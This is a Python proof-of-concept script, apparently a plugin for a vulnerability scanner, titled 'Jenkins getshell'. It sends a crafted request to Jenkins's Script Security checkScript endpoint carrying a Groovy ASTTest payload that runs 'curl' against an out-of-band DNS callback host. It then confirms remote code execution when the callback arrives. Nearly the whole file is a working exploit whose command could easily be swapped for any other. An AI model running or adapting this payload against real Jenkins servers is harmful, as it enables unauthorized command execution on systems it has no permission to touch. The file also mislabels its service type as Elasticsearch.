#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import asyncio
import random
from lib.utils.connect import ClientSession
from script import Script, SERVICE_PORT_MAP, VUL_TYPE, VUL_LEVEL

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.ELASTICSEARCH
        self.name = 'Jenkins getshell'
        self.keyword = ['jenkins']
        self.info = 'Jenkins getshell'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.CRITICAL
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            if self.base_url != None:
                async with ClientSession() as session:
                    dns = self.ceye_dns_api(k='jenkinsgs', t='url')
                    url = self.base_url + "securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7b+%22curl+"+ dns +"%22.execute().text+%7d)%0aclass+Person%7b%7d"
                    async with session.get(url=url, allow_redirects=False) as res:
                        if res:
                            text = await res.text()
                            pass
                    await asyncio.sleep(1)
                    if await self.ceye_verify_api(dns, 'dns'):
                        self.flag = 1
                        self.res.append({"info": url, "key": 'Jenkins getshell'})
